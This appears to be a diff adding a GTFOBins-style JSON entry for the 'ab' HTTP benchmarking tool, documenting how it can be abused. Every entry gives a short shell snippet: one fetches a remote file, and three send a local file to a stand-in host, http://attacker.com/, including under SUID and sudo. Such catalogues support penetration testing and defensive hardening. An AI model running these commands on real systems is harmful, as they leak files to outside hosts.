@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "file-upload": [
+      {
+        "description": "Upload local file via HTTP POST request.",
+        "code": "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
+        "code": "URL=http://attacker.com/file_to_download\nab -v2 $URL\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Upload local file via HTTP POST request.",
+        "code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Upload local file via HTTP POST request.",
+        "code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
+      }
+    ]
+  }
+}
